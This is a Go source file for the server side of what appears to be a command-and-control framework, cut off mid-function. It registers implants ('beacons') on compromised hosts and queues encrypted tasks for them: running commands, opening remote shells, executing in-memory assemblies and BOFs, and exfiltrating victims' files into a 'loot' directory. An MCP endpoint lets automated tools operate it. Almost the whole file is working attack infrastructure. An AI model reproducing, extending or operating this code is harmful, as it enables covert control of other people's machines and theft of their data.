package server

import (
	"c2/ui"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"c2/auth"
	"c2/builder"
	"c2/models"
	"c2/protocol"
	"c2/store"
	"golang.org/x/time/rate"
)

type saver interface {
	SaveListeners([]*models.Listener)
	SaveBeacons([]*models.Beacon)
	SaveEvents([]*models.Event)
	SaveTerminals(map[uint32]*models.TerminalState)
	SaveLoot([]*models.ExfilEntry)
	SaveRSAKey(*rsa.PrivateKey)
}

type Handler struct {
	store           *store.Store
	privKey         *rsa.PrivateKey
	beaconSrc       string // empty = build disabled
	lm              listenerStarter
	p               saver
	managementPort  int
	sessionListener *SessionListener
	hub             *Hub
	socksMgr        *SocksManager
	authSvc         *auth.Auth
	jwtKey          []byte
	chatLimitersMu  sync.Mutex
	chatLimiters    map[string]*rate.Limiter
	wsTicketsMu     sync.Mutex
	wsTickets       map[string]wsTicket
}

const (
	maxUploadFileBytes          int64  = 256 << 20
	maxUploadBodyBytes          int64  = maxUploadFileBytes + (1 << 20)
	maxAssemblyFileBytes        int64  = 64 << 20
	maxAssemblyBodyBytes        int64  = maxAssemblyFileBytes + (1 << 20)
	maxInlineAssemblyFileBytes  int64  = 3 << 20
	maxInlineAssemblyBodyBytes  int64  = maxInlineAssemblyFileBytes + (1 << 20)
	maxBOFFileBytes             int64  = 1 << 20
	maxBOFBodyBytes             int64  = maxBOFFileBytes + (1 << 20)
	maxMultipartMemory          int64  = 8 << 20
	inlineAssemblyBOFIdentifier uint32 = 0x49414246
	wsTicketTTL                        = 30 * time.Second
)

var errFileTooLarge = errors.New("file too large")

type wsTicket struct {
	Username  string
	ExpiresAt time.Time
}

func (h *Handler) HandleWSTicket(w http.ResponseWriter, r *http.Request) {
	username, _ := r.Context().Value(operatorKey).(string)
	if username == "" {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	ticket, err := h.issueWSTicket(username)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Ticket    string `json:"ticket"`
		ExpiresIn int    `json:"expires_in"`
	}{Ticket: ticket, ExpiresIn: int(wsTicketTTL.Seconds())})
}

func (h *Handler) issueWSTicket(username string) (string, error) {
	var raw [32]byte
	if _, err := rand.Read(raw[:]); err != nil {
		return "", err
	}
	ticket := base64.RawURLEncoding.EncodeToString(raw[:])
	now := time.Now()
	h.wsTicketsMu.Lock()
	h.purgeExpiredWSTicketsLocked(now)
	h.wsTickets[ticket] = wsTicket{Username: username, ExpiresAt: now.Add(wsTicketTTL)}
	h.wsTicketsMu.Unlock()
	return ticket, nil
}

func (h *Handler) consumeWSTicket(ticket string) (string, bool) {
	ticket = strings.TrimSpace(ticket)
	if ticket == "" {
		return "", false
	}
	now := time.Now()
	h.wsTicketsMu.Lock()
	h.purgeExpiredWSTicketsLocked(now)
	entry, ok := h.wsTickets[ticket]
	if ok {
		delete(h.wsTickets, ticket)
	}
	h.wsTicketsMu.Unlock()
	if !ok || now.After(entry.ExpiresAt) {
		return "", false
	}
	return entry.Username, true
}

func (h *Handler) purgeExpiredWSTicketsLocked(now time.Time) {
	for ticket, entry := range h.wsTickets {
		if now.After(entry.ExpiresAt) {
			delete(h.wsTickets, ticket)
		}
	}
}

func NewHandler(s *store.Store, privKey *rsa.PrivateKey, beaconSrc string, lm listenerStarter, p saver, managementPort int, sl *SessionListener, hub *Hub, socksMgr *SocksManager, authSvc *auth.Auth, jwtKey []byte) *Handler {
	return &Handler{store: s, privKey: privKey, beaconSrc: beaconSrc, lm: lm, p: p, managementPort: managementPort, sessionListener: sl, hub: hub, socksMgr: socksMgr, authSvc: authSvc, jwtKey: jwtKey, chatLimiters: make(map[string]*rate.Limiter), wsTickets: make(map[string]wsTicket)}
}

func (h *Handler) logEvent(evType, msg string) {
	evt := &models.Event{Type: evType, Message: msg, Timestamp: time.Now()}
	h.store.AddEvent(evt)
	h.p.SaveEvents(h.store.ListEvents())
	h.hub.Publish("events", "add", evt)
}

func parseMultipartLimited(w http.ResponseWriter, r *http.Request, maxBytes int64) error {
	r.Body = http.MaxBytesReader(w, r.Body, maxBytes)
	return r.ParseMultipartForm(maxMultipartMemory)
}

func cleanupMultipart(r *http.Request) {
	if r.MultipartForm != nil {
		_ = r.MultipartForm.RemoveAll()
	}
}

func readFormFileLimited(file multipartFile, maxBytes int64) ([]byte, error) {
	limited := io.LimitReader(file, maxBytes+1)
	data, err := io.ReadAll(limited)
	if err != nil {
		return nil, err
	}
	if int64(len(data)) > maxBytes {
		return nil, errFileTooLarge
	}
	return data, nil
}

type multipartFile interface {
	io.Reader
}

func lootDir() string {
	if configured := strings.TrimSpace(os.Getenv("BEBOP_LOOT_DIR")); configured != "" {
		return configured
	}
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		return "exfil"
	}
	return filepath.Join(home, ".bebop", "exfil")
}

func LootDir() string {
	return lootDir()
}

func legacyLootPath(label uint32, filename string) string {
	return filepath.Join("exfil", fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
}

func lootPath(label uint32, filename string) string {
	return filepath.Join(lootDir(), fmt.Sprintf("%d_%s", label, filepath.Base(filename)))
}

func writeLootFile(label uint32, filename string, data []byte) error {
	dir := lootDir()
	if err := os.MkdirAll(dir, 0700); err != nil {
		return err
	}
	path := lootPath(label, filename)
	tmp, err := os.CreateTemp(dir, fmt.Sprintf(".%d_", label))
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	defer os.Remove(tmpName)
	if _, err := tmp.Write(data); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Chmod(0600); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	return os.Rename(tmpName, path)
}

func contentDispositionAttachment(filename string) string {
	return mime.FormatMediaType("attachment", map[string]string{"filename": filepath.Base(filename)})
}

func (h *Handler) HandleLogin(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}
	if !h.authSvc.ValidatePassword(req.Username, req.Password) {
		http.Error(w, "invalid credentials", http.StatusUnauthorized)
		return
	}
	token, err := auth.SignToken(req.Username, h.jwtKey)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	h.logEvent("auth", fmt.Sprintf("operator '%s' logged in", req.Username))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Token string `json:"token"`
	}{Token: token})
}

func (h *Handler) HandleLogout(w http.ResponseWriter, r *http.Request) {
	token := r.Header.Get("Authorization")
	if !strings.HasPrefix(token, "Bearer ") {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	raw := token[7:]
	username, err := auth.ValidateToken(raw, h.jwtKey)
	if err != nil {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	auth.RevokeToken(raw, h.jwtKey)
	h.logEvent("auth", fmt.Sprintf("operator '%s' logged out", username))
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleMCPStatus(w http.ResponseWriter, r *http.Request) {
	baseURL := mcpStatusBaseURL(r, h.managementPort)
	status := struct {
		Mode            string   `json:"mode"`
		Endpoint        string   `json:"endpoint"`
		TeamserverURL   string   `json:"teamserver_url"`
		TokenConfigured bool     `json:"token_configured"`
		MutationDefault bool     `json:"mutation_default"`
		ToolsReadonly   []string `json:"tools_readonly"`
		ToolsMutating   []string `json:"tools_mutating"`
		Resources       []string `json:"resources"`
	}{
		Mode:            "http",
		Endpoint:        baseURL + "/api/mcp",
		TeamserverURL:   baseURL,
		TokenConfigured: configuredMCPToken() != "",
		MutationDefault: mcpMutationAllowed(),
		ToolsReadonly:   mcpReadOnlyToolNames(),
		ToolsMutating:   mcpMutatingToolNames(),
		Resources:       mcpResourceURIs(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(status)
}

func mcpStatusBaseURL(r *http.Request, fallbackPort int) string {
	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}
	if forwarded := strings.TrimSpace(r.Header.Get("X-Forwarded-Proto")); forwarded != "" {
		candidate := strings.ToLower(strings.TrimSpace(strings.Split(forwarded, ",")[0]))
		if candidate == "http" || candidate == "https" {
			scheme = candidate
		}
	}
	host := strings.TrimSpace(r.Host)
	if host == "" {
		host = fmt.Sprintf("127.0.0.1:%d", fallbackPort)
	}
	return scheme + "://" + host
}

func (h *Handler) HandleMCPToken(w http.ResponseWriter, r *http.Request) {
	baseToken := configuredMCPToken()
	if baseToken == "" {
		http.Error(w, "mcp token not configured", http.StatusNotFound)
		return
	}
	operator, _ := r.Context().Value(operatorKey).(string)
	operator = normalizeMCPOperator(operator)
	token := makeMCPOperatorToken(baseToken, operator)
	if token == "" {
		http.Error(w, "mcp token unavailable", http.StatusInternalServerError)
		return
	}
	h.logEvent("mcp", fmt.Sprintf("operator '%s' revealed MCP token", operator))
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Token    string `json:"token"`
		Operator string `json:"operator"`
	}{Token: token, Operator: operator})
}

func StartTokenPurge() {
	go func() {
		for {
			time.Sleep(15 * time.Minute)
			auth.PurgeExpiredTokens()
		}
	}()
}

// newBeaconMux returns a mux with only the beacon protocol routes.
// Used by additional (non-management) listeners.
func newBeaconMux(h *Handler) *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/pubkey", h.HandleGetPubKey)
	mux.HandleFunc("POST /api/register", h.HandleRegister)
	mux.HandleFunc("POST /api/checkin", h.HandleCheckin)
	mux.HandleFunc("POST /api/result", h.HandleResult)
	return mux
}

func (h *Handler) HandleGetPubKey(w http.ResponseWriter, r *http.Request) {
	pubDER, err := x509.MarshalPKIXPublicKey(&h.privKey.PublicKey)
	if err != nil {
		http.Error(w, "key marshal error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	pem.Encode(w, &pem.Block{Type: "PUBLIC KEY", Bytes: pubDER})
}

func (h *Handler) HandleRegister(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 8*1024))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	plaintext, err := protocol.DecryptMetadata(h.privKey, body)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	meta, err := protocol.DecodeImplantMetadata(plaintext)
	if err != nil {
		http.Error(w, "decode error", http.StatusBadRequest)
		return
	}

	// Capture listener ID from context (injected by middleware)
	if id, ok := r.Context().Value(listenerIDKey).(uint32); ok {
		meta.ListenerID = id
	} else {
		// Default to ID 1 if not through a dynamic listener (management listener)
		meta.ListenerID = 1
	}

	if !h.store.RegisterBeacon(meta) {
		http.Error(w, "duplicate beacon id", http.StatusConflict)
		return
	}
	h.p.SaveBeacons(h.store.ListBeacons())
	beacon := h.store.GetBeacon(meta.ID)
	h.hub.Publish("sessions", "add", map[string]interface{}{
		"id": meta.ID, "hostname": meta.Hostname, "username": meta.Username,
		"process_name": meta.ProcessName, "process_id": meta.ProcessID,
		"arch": meta.Arch, "platform": meta.Platform, "integrity": meta.Integrity,
		"sleep": meta.Sleep, "jitter": meta.Jitter,
		"first_seen": beacon.FirstSeen.Unix(), "last_seen": beacon.LastSeen.Unix(),
		"alive": true, "listener_id": meta.ListenerID, "listener_name": func() string {
			if l := h.store.GetListener(meta.ListenerID); l != nil {
				return l.Name
			}
			return "Unknown"
		}(), "mode": "beacon", "shell_active": false,
	})
	h.logEvent("new", fmt.Sprintf("new session #%d %s %s", meta.ID, meta.Hostname, meta.Username))
	w.WriteHeader(http.StatusOK)
}

func (h *Handler) HandleCheckin(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 64))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
	h.p.SaveBeacons(h.store.ListBeacons())

	tasks := h.store.DrainPendingTasks(beaconID)

	var payload []byte
	if len(tasks) == 0 {
		nop := protocol.NewNOP()
		payload = protocol.EncodeHeader(nop.Header)
	} else {
		for _, task := range tasks {
			hdr := protocol.TaskHeader{
				Type:       task.Type,
				Code:       task.Code,
				Flags:      task.Flags,
				Label:      task.Label,
				Identifier: task.Identifier,
				Length:     uint32(len(task.Data)),
			}
			payload = append(payload, append(protocol.EncodeHeader(hdr), task.Data...)...)
		}
	}

	encrypted, err := protocol.Encrypt(beacon.SessionKey, payload)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(encrypted)))
	if _, err := w.Write(encrypted); err != nil {
		ui.Errorf("checkin", "write: %v", err)
	}

	for _, task := range tasks {
		if task.Type == protocol.TaskSet && task.Code == 0 && len(task.Data) >= 8 {
			interval := binary.LittleEndian.Uint32(task.Data[:4])
			jitter := binary.LittleEndian.Uint32(task.Data[4:8])
			h.store.UpdateBeaconSleep(beaconID, interval, jitter)
			h.hub.Publish("sessions", "update", map[string]interface{}{
				"id": beaconID, "sleep": interval, "jitter": jitter,
			})
			h.store.StoreResult(&models.Result{
				Label:      task.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskSet,
				Output:     fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(task.Label)
			h.p.SaveBeacons(h.store.ListBeacons())
			h.hub.Publish("results", "add", map[string]interface{}{
				"label": task.Label, "beacon_id": beaconID, "output": fmt.Sprintf("sleep=%ds jitter=%d%%", interval, jitter),
				"received_at": time.Now().Unix(), "type": protocol.TaskSet,
			})
		}

		if task.Type == protocol.TaskExit {
			h.store.DeleteBeacon(beaconID)
			h.hub.Publish("sessions", "delete", map[string]interface{}{"id": beaconID})
			h.p.SaveBeacons(h.store.ListBeacons())
		}
	}
}

func (h *Handler) HandleResult(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 2*1024*1024))
	if err != nil || len(body) < 4 {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	beaconID := binary.LittleEndian.Uint32(body[:4])
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	h.store.UpdateLastSeen(beaconID)
	h.hub.Publish("sessions", "checkin", map[string]interface{}{"id": beaconID})
	h.p.SaveBeacons(h.store.ListBeacons())

	plaintext, err := protocol.Decrypt(beacon.SessionKey, body[4:])
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	if len(plaintext) < 16 {
		http.Error(w, "payload too short", http.StatusBadRequest)
		return
	}

	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		http.Error(w, "decode header error", http.StatusBadRequest)
		return
	}

	if hdr.Type == protocol.TaskFileExfil {
		done, filename, assembled := h.store.AddExfilFragment(hdr.Label, hdr.Identifier, hdr.Flags, plaintext[16:])
		if done {
			if filename == "" {
				ui.Errorf("exfil", "label=%d completed with empty filename, discarding", hdr.Label)
				w.WriteHeader(http.StatusOK)
				return
			}
			if err := h.saveExfilFile(hdr.Label, filename, assembled); err != nil {
				ui.Errorf("exfil", "save label=%d: %v", hdr.Label, err)
				h.store.StoreResult(&models.Result{
					Label:      hdr.Label,
					BeaconID:   beaconID,
					Type:       protocol.TaskFileExfil,
					Flags:      1, // FLAG_ERROR
					Output:     fmt.Sprintf("disk save failed: %v", err),
					ReceivedAt: time.Now(),
				})
				h.store.MarkTaskDone(hdr.Label)
				w.WriteHeader(http.StatusOK)
				return
			}
			h.store.MarkExfilDone(hdr.Label, filename, beaconID, int64(len(assembled)))
			h.hub.Publish("loot", "add", map[string]interface{}{
				"label": hdr.Label, "filename": filename, "beacon_id": beaconID,
				"size": int64(len(assembled)), "exfil_at": time.Now().Unix(),
			})
			h.logEvent("exfil", fmt.Sprintf("file exfiltrated from #%d: %s (%d bytes)", beaconID, filename, len(assembled)))
			h.store.StoreResult(&models.Result{
				Label:      hdr.Label,
				BeaconID:   beaconID,
				Type:       protocol.TaskFileExfil,
				Filename:   filename,
				ReceivedAt: time.Now(),
			})
			h.store.MarkTaskDone(hdr.Label)
			h.p.SaveLoot(h.store.ListExfilFiles())
			h.hub.Publish("results", "add", map[string]interface{}{
				"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileExfil,
				"filename": filename, "output": "", "received_at": time.Now().Unix(),
			})
		}
	} else if hdr.Type == protocol.TaskFileStage {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.logEvent("upload", fmt.Sprintf("file staged on #%d: %s", beaconID, output))
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Type:       protocol.TaskFileStage,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", map[string]interface{}{
			"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskFileStage,
			"flags": hdr.Flags, "output": output, "received_at": time.Now().Unix(),
		})
	} else if hdr.Type == protocol.TaskInlineAssembly {
		receivedAt := time.Now()
		inlineResult, err := protocol.DecodeInlineAssemblyResult(plaintext[16:])
		result := newInlineAssemblyResult(beaconID, hdr, inlineResult, receivedAt)
		if err != nil {
			result = newInlineAssemblyDecodeErrorResult(beaconID, hdr, err, receivedAt)
		}
		h.store.StoreResult(result)
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", inlineAssemblyResultEventPayload(result))
	} else if hdr.Type == protocol.TaskBOF {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		receivedAt := time.Now()
		if isInlineAssemblyBOFTask(h.store.GetTaskByLabel(hdr.Label)) {
			result := newInlineAssemblyTextResult(beaconID, hdr, output, receivedAt)
			h.store.StoreResult(result)
			h.store.MarkTaskDone(hdr.Label)
			h.hub.Publish("results", "add", inlineAssemblyResultEventPayload(result))
			w.WriteHeader(http.StatusOK)
			return
		}
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Type:       protocol.TaskBOF,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: receivedAt,
		})
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", map[string]interface{}{
			"label": hdr.Label, "beacon_id": beaconID, "type": protocol.TaskBOF,
			"flags": hdr.Flags, "output": output, "received_at": receivedAt.Unix(),
		})
	} else {
		output, _ := protocol.DecodeRunRep(plaintext[16:])
		h.store.StoreResult(&models.Result{
			Label:      hdr.Label,
			BeaconID:   beaconID,
			Flags:      hdr.Flags,
			Output:     output,
			ReceivedAt: time.Now(),
		})
		h.store.MarkTaskDone(hdr.Label)
		h.hub.Publish("results", "add", map[string]interface{}{
			"label": hdr.Label, "beacon_id": beaconID, "flags": hdr.Flags,
			"output": output, "received_at": time.Now().Unix(),
		})
	}

	w.WriteHeader(http.StatusOK)
}

func (h *Handler) saveExfilFile(label uint32, filename string, data []byte) error {
	return writeLootFile(label, filename, data)
}

func formatInlineAssemblyOutput(r protocol.InlineAssemblyResult) string {
	var b strings.Builder
	fmt.Fprintf(&b, "Exit Code: %d\nDuration: %d ms\nTruncated: %t",
		r.ExitCode, r.DurationMS, r.Truncated)
	appendInlineAssemblySection(&b, "Stdout", r.Stdout)
	appendInlineAssemblySection(&b, "Stderr", r.Stderr)
	appendInlineAssemblySection(&b, "Exception", r.Exception)
	appendInlineAssemblySection(&b, "Diagnostics", r.Diagnostics)
	return b.String()
}

func appendInlineAssemblySection(b *strings.Builder, name, value string) {
	if value == "" {
		return
	}
	b.WriteString("\n\n")
	b.WriteString(name)
	b.WriteString(":\n")
	b.WriteString(value)
}

func newInlineAssemblyResult(beaconID uint32, hdr protocol.TaskHeader, inlineResult protocol.InlineAssemblyResult, receivedAt time.Time) *models.Result {
	return &models.Result{
		Label:         hdr.Label,
		BeaconID:      beaconID,
		Flags:         hdr.Flags,
		Type:          protocol.TaskInlineAssembly,
		Output:        formatInlineAssemblyOutput(inlineResult),
		ExitCode:      inlineResult.ExitCode,
		Stdout:        inlineResult.Stdout,
		Stderr:        inlineResult.Stderr,
		Exception:     inlineResult.Exception,
		DurationMS:    inlineResult.DurationMS,
		Truncated:     inlineResult.Truncated,
		Mode:          inlineResult.Mode,
		BridgeVersion: inlineResult.BridgeVersion,
		Diagnostics:   inlineResult.Diagnostics,
		ReceivedAt:    receivedAt,
	}
}

func newInlineAssemblyDecodeErrorResult(beaconID uint32, hdr protocol.TaskHeader, decodeErr error, receivedAt time.Time) *models.Result {
	inlineResult := protocol.InlineAssemblyResult{
		ExitCode:    -1,
		Exception:   decodeErr.Error(),
		Mode:        "decode-error",
		Diagnostics: "inline result decode failed on teamserver",
	}
	return newInlineAssemblyResult(beaconID, hdr, inlineResult, receivedAt)
}

func isInlineAssemblyBOFTask(task *models.Task) bool {
	return task != nil &&
		task.Type == protocol.TaskBOF &&
		task.Identifier == inlineAssemblyBOFIdentifier
}

func newInlineAssemblyTextResult(beaconID uint32, hdr protocol.TaskHeader, output string, receivedAt time.Time) *models.Result {
	inlineResult := parseInlineAssemblyTextOutput(output)
	result := newInlineAssemblyResult(beaconID, hdr, inlineResult, receivedAt)
	result.Output = output
	return result
}

func parseInlineAssemblyTextOutput(output string) protocol.InlineAssemblyResult {
	result := protocol.InlineAssemblyResult{
		ExitCode:      -1,
		Mode:          "bridge",
		BridgeVersion: "Runtime.Loader",
		Stdout:        inlineAssemblyTextSection(output, "STDOUT"),
		Stderr:        inlineAssemblyTextSection(output, "STDERR"),
		Exception:     inlineAssemblyTextSection(output, "EXCEPTION"),
		Diagnostics:   inlineAssemblyTextSection(output, "DIAGNOSTICS"),
	}
	for _, raw := range strings.Split(output, "\n") {
		line := strings.TrimSpace(raw)
		switch {
		case strings.HasPrefix(line, "Exit:"):
			n, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "Exit:")))
			if err == nil {
				result.ExitCode = int32(n)
			}
		case strings.HasPrefix(line, "Duration:"):
			value := strings.TrimSpace(strings.TrimPrefix(line, "Duration:"))
			value = strings.TrimSuffix(value, "ms")
			value = strings.TrimSpace(value)
			n, err := strconv.ParseUint(value, 10, 32)
			if err == nil {
				result.DurationMS = uint32(n)
			}
		case strings.HasPrefix(line, "Truncated:"):
			result.Truncated = strings.EqualFold(strings.TrimSpace(strings.TrimPrefix(line, "Truncated:")), "true")
		}
	}
	if result.Diagnostics == "" && !strings.Contains(output, "[inline-assembly]") {
		result.Diagnostics = output
	}
	return result
}

func inlineAssemblyTextSection(output, name string) string {
	marker := name + ":"
	start := -1
	if strings.HasPrefix(output, marker) {
		start = len(marker)
	} else if idx := strings.Index(output, "\n"+marker); idx >= 0 {
		start = idx + 1 + len(marker)
	}
	if start < 0 {
		return ""
	}
	for start < len(output) && (output[start] == '\r' || output[start] == '\n') {
		start++
	}
	end := len(output)
	for _, nextName := range []string{"STDOUT", "STDERR", "EXCEPTION", "DIAGNOSTICS"} {
		if nextName == name {
			continue
		}
		if idx := strings.Index(output[start:], "\n"+nextName+":"); idx >= 0 && start+idx < end {
			end = start + idx
		}
	}
	return strings.Trim(output[start:end], "\r\n")
}

func inlineAssemblyResultEventPayload(result *models.Result) map[string]interface{} {
	return map[string]interface{}{
		"label":          result.Label,
		"beacon_id":      result.BeaconID,
		"flags":          result.Flags,
		"type":           result.Type,
		"output":         result.Output,
		"exit_code":      result.ExitCode,
		"stdout":         result.Stdout,
		"stderr":         result.Stderr,
		"exception":      result.Exception,
		"duration_ms":    result.DurationMS,
		"truncated":      result.Truncated,
		"mode":           result.Mode,
		"bridge_version": result.BridgeVersion,
		"diagnostics":    result.Diagnostics,
		"received_at":    result.ReceivedAt.Unix(),
	}
}

func (h *Handler) HandleQueueTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BeaconID  uint32 `json:"beacon_id"`
		Type      uint8  `json:"type"`
		Code      uint8  `json:"code"`
		Args      string `json:"args"`
		Transport string `json:"transport"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", http.StatusBadRequest)
		return
	}

	if h.store.GetBeacon(req.BeaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	var data []byte
	if req.Type == protocol.TaskRun {
		data = protocol.EncodeRunReq(req.Args)
	} else if req.Type == protocol.TaskFileExfil {
		data = append([]byte(req.Args), 0) // null-terminated path for beacon
	} else if req.Type == protocol.TaskSet && req.Code == 0 { // CODE_SET_SLEEP
		// Parse "seconds [jitter]"
		parts := strings.Fields(req.Args)
		var seconds, jitter uint32
		if len(parts) >= 1 {
			v, _ := strconv.ParseUint(parts[0], 10, 32)
			seconds = uint32(v)
		}
		if len(parts) >= 2 {
			v, _ := strconv.ParseUint(parts[1], 10, 32)
			jitter = uint32(v)
		} else {
			jitter = 20 // Default jitter
		}
		data = protocol.EncodeSetSleepReq(seconds, jitter)
	}

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])

	task := &models.Task{
		Label:     label,
		BeaconID:  req.BeaconID,
		Type:      req.Type,
		Code:      req.Code,
		Data:      data,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}

	// TaskShellStart: embed session listener port, send via session TCP if
	// beacon is in session mode, otherwise queue for HTTP checkin.
	if req.Type == protocol.TaskShellStart && h.sessionListener != nil {
		portLE := make([]byte, 2)
		binary.LittleEndian.PutUint16(portLE, uint16(h.sessionListener.Port))
		data = portLE
		task.Data = portLE
		if h.store.IsSession(req.BeaconID) {
			taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
				Type:   req.Type,
				Code:   req.Code,
				Label:  label,
				Length: uint32(len(data)),
			})
			taskMsg = append(taskMsg, data...)
			if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
				h.store.QueueTask(task)
			} else {
				task.Status = models.TaskStatusSent
				h.store.QueueTask(task)
			}
		} else {
			h.store.QueueTask(task)
		}
	} else if h.sessionListener != nil && (req.Type == protocol.TaskShellInput || req.Type == protocol.TaskShellStop) && h.store.IsShell(req.BeaconID) {
		// Route shell input/stop to the dedicated shell TCP connection
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   req.Type,
			Code:   req.Code,
			Label:  label,
			Length: uint32(len(data)),
		})
		taskMsg = append(taskMsg, data...)
		if err := h.sessionListener.SendShellTask(req.BeaconID, taskMsg); err != nil {
			h.store.QueueTask(task)
		} else {
			task.Status = models.TaskStatusSent
			h.store.QueueTask(task)
		}
	} else if req.Transport != "http" && h.sessionListener != nil && h.store.IsSession(req.BeaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   req.Type,
			Code:   req.Code,
			Label:  label,
			Length: uint32(len(data)),
		})
		taskMsg = append(taskMsg, data...)
		if err := h.sessionListener.SendTask(req.BeaconID, taskMsg); err != nil {
			h.store.QueueTask(task)
		} else {
			task.Status = models.TaskStatusSent
			h.store.QueueTask(task)
			if req.Type == protocol.TaskSet && req.Code == 0 && len(data) >= 8 {
				interval := binary.LittleEndian.Uint32(data[:4])
				jitter := binary.LittleEndian.Uint32(data[4:8])
				h.store.UpdateBeaconSleep(req.BeaconID, interval, jitter)
				h.hub.Publish("sessions", "update", map[string]interface{}{
					"id": req.BeaconID, "sleep": interval, "jitter": jitter,
				})
				h.p.SaveBeacons(h.store.ListBeacons())
			}
		}
	} else {
		h.store.QueueTask(task)
	}

	operator, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("task", fmt.Sprintf("operator '%s' queued task #%d type=%d args=%s", operator, req.BeaconID, req.Type, redactEventArgs(req.Args)))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(struct {
		Label uint32 `json:"label"`
	}{Label: label})
}

func redactEventArgs(args string) string {
	fields := tokenizeEventArgs(args)
	if len(fields) == 0 {
		return args
	}
	redactNext := false
	for i, field := range fields {
		if redactNext {
			fields[i] = "[redacted]"
			redactNext = strings.EqualFold(strings.Trim(field, "\"'"), "Bearer")
			continue
		}
		if key, value, ok := splitSensitiveAssignment(field); ok {
			if value == "" {
				fields[i] = key + "=[redacted]"
			} else {
				fields[i] = key + field[len(key):len(field)-len(value)] + "[redacted]"
			}
			continue
		}
		if isSensitiveArgKey(field) || strings.EqualFold(field, "Bearer") {
			redactNext = true
		}
	}
	return strings.Join(fields, " ")
}

func tokenizeEventArgs(args string) []string {
	var fields []string
	var b strings.Builder
	var quote rune
	escaped := false
	for _, r := range args {
		if escaped {
			b.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && quote != 0 {
			escaped = true
			continue
		}
		if quote != 0 {
			b.WriteRune(r)
			if r == quote {
				quote = 0
			}
			continue
		}
		if r == '\'' || r == '"' {
			quote = r
			b.WriteRune(r)
			continue
